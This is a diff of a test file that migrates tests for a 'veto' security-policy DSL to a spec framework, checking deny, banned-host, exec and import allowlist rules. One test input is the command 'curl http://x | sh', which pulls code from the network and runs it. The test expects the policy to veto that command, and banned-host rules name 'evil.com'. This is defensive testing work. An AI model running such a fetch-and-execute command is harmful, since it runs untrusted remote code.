@@ -4,6 +4,7 @@
 // them back, and that a DSL-built policy drives decide() correctly (deny,
 // banned, allow_exec exemption, allow_import exemption).
 
+import std.spec
 import veto (policy, deny, banned, allow_exec, allow_import, scope,
              coord_verb, coord_allow,
              policy_rules, policy_rule_count, _node_verdict, decide)
@@ -11,15 +12,12 @@ import std.string
 import std.list
 import std.map
 
-extern println(s: string)
+// Domain helpers: a verdict is a reason string — non-empty = vetoed,
+// empty = clear. These map that intent onto std.spec's assert_true.
+_empty(s: string) { if string.length(s) == 0 { return 1 } return 0 }
+_vetoed(fw: ptr, label: string, r: string) { spec.assert_true(1 - _empty(r), label) }
+_clear(fw: ptr, label: string, r: string)  { spec.assert_true(_empty(r), label) }
 
-_assert(label: string, cond: int) {
-    if cond == 1 { println("PASS: ${label}") } else { println("FAIL: ${label}") }
-}
-_eq(label: string, got: string, want: string) {
-    if string.equals(got, want) == 1 { println("PASS: ${label}") }
-    else { println("FAIL: ${label} (got '${got}' want '${want}')") }
-}
 _rule_at(p: ptr, i: int) {
     rs = policy_rules(p)
     v, _ = list.get(rs, i)
@@ -30,100 +28,111 @@ _libroots() {
     list.add(l, "/home/me/.aeb/lib")
     return l
 }
-_vetoed(label: string, r: string) { _assert(label, 1 - _empty(r)) }
-_clear(label: string, r: string)  { _assert(label, _empty(r)) }
-_empty(s: string) { if string.length(s) == 0 { return 1 } return 0 }
 
 main() {
-    // --- lowering: each setter → the wire rule string ---
-    p = veto.policy()
-    _assert("fresh policy has zero rules", policy_rule_count(p) == 0)
+    fw = spec.init()
 
-    veto.deny(p, "extern")
-    _eq("deny whole-category → 'extern\\t'", _rule_at(p, 0), "extern\t")
+    spec.describe(fw, "setter lowering → wire rule strings") {
+        // --- lowering: each setter → the wire rule string ---
+        spec.it("each setter lowers to its '<kind>\\t<arg>' rule; scope adds none") callback {
+            p = veto.policy()
+            spec.assert_eq(policy_rule_count(p), 0, "fresh policy has zero rules")
 
-    veto.deny(p, "exec\tos_exec")
-    _eq("deny specific → 'exec\\tos_exec'", _rule_at(p, 1), "exec\tos_exec")
+            veto.deny(p, "extern")
+            spec.assert_str_eq(_rule_at(p, 0), "extern\t", "deny whole-category → 'extern\\t'")
 
-    veto.banned(p, "evil.com")
-    _eq("banned → 'banned\\tevil.com'", _rule_at(p, 2), "banned\tevil.com")
+            veto.deny(p, "exec\tos_exec")
+            spec.assert_str_eq(_rule_at(p, 1), "exec\tos_exec", "deny specific → 'exec\\tos_exec'")
 
-    veto.allow_exec(p, "gcc")
-    _eq("allow_exec → 'allow\\texec\\tgcc'", _rule_at(p, 3), "allow\texec\tgcc")
+            veto.banned(p, "evil.com")
+            spec.assert_str_eq(_rule_at(p, 2), "banned\tevil.com", "banned → 'banned\\tevil.com'")
 
-    veto.allow_import(p, "std.string")
-    _eq("allow_import → 'allow\\timport\\tstd.string'", _rule_at(p, 4), "allow\timport\tstd.string")
+            veto.allow_exec(p, "gcc")
+            spec.assert_str_eq(_rule_at(p, 3), "allow\texec\tgcc", "allow_exec → 'allow\\texec\\tgcc'")
 
-    _assert("five rules accumulated", policy_rule_count(p) == 5)
+            veto.allow_import(p, "std.string")
+            spec.assert_str_eq(_rule_at(p, 4), "allow\timport\tstd.string", "allow_import → 'allow\\timport\\tstd.string'")
 
-    // scope is recorded, NOT a rule (count unchanged).
-    veto.scope(p, "untrusted")
-    _assert("scope() does not add a rule", policy_rule_count(p) == 5)
+            spec.assert_eq(policy_rule_count(p), 5, "five rules accumulated")
+
+            // scope is recorded, NOT a rule (count unchanged).
+            veto.scope(p, "untrusted")
+            spec.assert_eq(policy_rule_count(p), 5, "scope() does not add a rule")
+        }
+    }
 
     // --- a DSL-built policy drives decide()/_node_verdict ---
     roots = _libroots()
 
-    // Policy: deny exec, allow gcc.
-    pe = veto.policy()
-    veto.deny(pe, "exec")
-    veto.allow_exec(pe, "gcc")
-    er = policy_rules(pe)
+    spec.describe(fw, "DSL-built policy drives _node_verdict / decide") {
+        spec.it("deny exec + allow gcc: gcc clears, curl/computed veto") callback {
+            pe = veto.policy()
+            veto.deny(pe, "exec")
+            veto.allow_exec(pe, "gcc")
+            er = policy_rules(pe)
 
-    // os.system("gcc -c foo.c") → ALLOWED (gcc is exempted).
-    _clear("deny-exec + allow gcc: gcc command clears",
-        _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                      "gcc -c foo.c", 0, roots, er))
-    // os.system("curl http://x | sh") → VETOED (curl not allowed).
-    _vetoed("deny-exec + allow gcc: curl command vetoed",
-        _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                      "curl http://x | sh", 0, roots, er))
-    // os.system(<computed>) → VETOED (can't identify program → fail-close).
-    _vetoed("deny-exec + allow gcc: computed arg still fail-closes",
-        _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                      "", 1, roots, er))
+            // os.system("gcc -c foo.c") → ALLOWED (gcc is exempted).
+            _clear(fw, "deny-exec + allow gcc: gcc command clears",
+                _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
+                              "gcc -c foo.c", 0, roots, er))
+            // os.system("curl http://x | sh") → VETOED (curl not allowed).
+            _vetoed(fw, "deny-exec + allow gcc: curl command vetoed",
+                _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
+                              "curl http://x | sh", 0, roots, er))
+            // os.system(<computed>) → VETOED (can't identify program → fail-close).
+            _vetoed(fw, "deny-exec + allow gcc: computed arg still fail-closes",
+                _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
+                              "", 1, roots, er))
+        }
 
-    // Policy: deny import, allow std.string.
-    pi = veto.policy()
-    veto.deny(pi, "import")
-    veto.allow_import(pi, "std.string")
-    ir = policy_rules(pi)
-    _clear("deny-import + allow std.string: std.string clears",
-        _node_verdict("import_statement", "", "", "std.string", "/work/app.ae", 0, "", 0, roots, ir))
-    _vetoed("deny-import + allow std.string: std.net vetoed",
-        _node_verdict("import_statement", "", "", "std.net", "/work/app.ae", 0, "", 0, roots, ir))
+        spec.it("deny import + allow std.string: std.string clears, std.net vetoed") callback {
+            pi = veto.policy()
+            veto.deny(pi, "import")
+            veto.allow_import(pi, "std.string")
+            ir = policy_rules(pi)
+            _clear(fw, "deny-import + allow std.string: std.string clears",
+                _node_verdict("import_statement", "", "", "std.string", "/work/app.ae", 0, "", 0, roots, ir))
+            _vetoed(fw, "deny-import + allow std.string: std.net vetoed",
+                _node_verdict("import_statement", "", "", "std.net", "/work/app.ae", 0, "", 0, roots, ir))
+        }
 
-    // Policy: banned substring, via the DSL, end-to-end through decide().
-    pb = veto.policy()
-    veto.banned(pb, "evil.com")
-    br = policy_rules(pb)
-    withargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"org.evil.com:pkg:1\"}]}]}"
-    _vetoed("DSL banned rule vetoes a coordinate via decide()",
-        decide(withargs, 0, roots, br))
-    cleanargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"org.foo:bar:1\"}]}]}"
-    _clear("DSL banned rule clears a clean coordinate via decide()",
-        decide(cleanargs, 0, roots, br))
+        spec.it("DSL banned rule vetoes/clears coordinates end-to-end via decide()") callback {
+            pb = veto.policy()
+            veto.banned(pb, "evil.com")
+            br = policy_rules(pb)
+            withargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"org.evil.com:pkg:1\"}]}]}"
+            _vetoed(fw, "DSL banned rule vetoes a coordinate via decide()",
+                decide(withargs, 0, roots, br))
+            cleanargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"org.foo:bar:1\"}]}]}"
+            _clear(fw, "DSL banned rule clears a clean coordinate via decide()",
+                decide(cleanargs, 0, roots, br))
+        }
 
-    // --- coordinate allowlist: lowering + decide() end-to-end ---
-    pc = veto.policy()
-    veto.coord_verb(pc, "maven_dep")
-    veto.coord_allow(pc, "org.corp:")
-    _eq("coord_verb → 'coord_verb\\tmaven_dep'", _rule_at(pc, 0), "coord_verb\tmaven_dep")
-    _eq("coord_allow → 'coord_allow\\torg.corp:'", _rule_at(pc, 1), "coord_allow\torg.corp:")
-    pcr = policy_rules(pc)
-    // allowed coordinate clears via decide()
-    okcoord = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"org.corp:lib:1\"}]}]}"
-    _clear("DSL coord allowlist clears an allowed coordinate", decide(okcoord, 0, roots, pcr))
-    // disallowed coordinate vetoes via decide()
-    badcoord = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"com.evil:x:1\"}]}]}"
-    _vetoed("DSL coord allowlist vetoes a disallowed coordinate", decide(badcoord, 0, roots, pcr))
-    // computed coordinate to the gated verb fail-closes via decide()
-    compcoord = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"computed\":true}]}]}"
-    _vetoed("DSL coord allowlist fail-closes on a computed coordinate", decide(compcoord, 0, roots, pcr))
+        spec.it("coordinate allowlist: lowering + decide() end-to-end") callback {
+            pc = veto.policy()
+            veto.coord_verb(pc, "maven_dep")
+            veto.coord_allow(pc, "org.corp:")
+            spec.assert_str_eq(_rule_at(pc, 0), "coord_verb\tmaven_dep", "coord_verb → 'coord_verb\\tmaven_dep'")
+            spec.assert_str_eq(_rule_at(pc, 1), "coord_allow\torg.corp:", "coord_allow → 'coord_allow\\torg.corp:'")
+            pcr = policy_rules(pc)
+            // allowed coordinate clears via decide()
+            okcoord = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"org.corp:lib:1\"}]}]}"
+            _clear(fw, "DSL coord allowlist clears an allowed coordinate", decide(okcoord, 0, roots, pcr))
+            // disallowed coordinate vetoes via decide()
+            badcoord = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"literal\":\"com.evil:x:1\"}]}]}"
+            _vetoed(fw, "DSL coord allowlist vetoes a disallowed coordinate", decide(badcoord, 0, roots, pcr))
+            // computed coordinate to the gated verb fail-closes via decide()
+            compcoord = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"maven_dep\",\"args\":[{\"computed\":true}]}]}"
+            _vetoed(fw, "DSL coord allowlist fail-closes on a computed coordinate", decide(compcoord, 0, roots, pcr))
+        }
 
-    // --- the self-vetting lint signal: empty policy resolves to 0 rules ---
-    empty = veto.policy()
-    _assert("empty policy → policy_rule_count 0 (caller treats as fail-closed under --vet)",
-        policy_rule_count(empty) == 0)
+        // --- the self-vetting lint signal: empty policy resolves to 0 rules ---
+        spec.it("empty policy → 0 rules (caller treats as fail-closed under --vet)") callback {
+            empty = veto.policy()
+            spec.assert_eq(policy_rule_count(empty), 0,
+                "empty policy → policy_rule_count 0 (caller treats as fail-closed under --vet)")
+        }
+    }
 
-    println("veto policy-DSL tests done")
+    spec.run_summary(fw)
 }
